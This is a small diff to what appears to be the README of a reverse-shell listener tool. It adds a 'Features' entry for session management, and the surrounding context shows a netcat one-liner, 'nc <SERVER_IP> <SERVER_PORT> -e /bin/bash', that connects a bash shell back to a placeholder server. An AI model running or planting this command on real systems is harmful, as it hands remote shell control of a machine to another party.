@@ -3,6 +3,11 @@
 
 <br>
 
+#### Features
+- session management
+
+<br>
+
 Supports raw shell clients like:
 
 ```nc <SERVER_IP> <SERVER_PORT> -e /bin/bash```
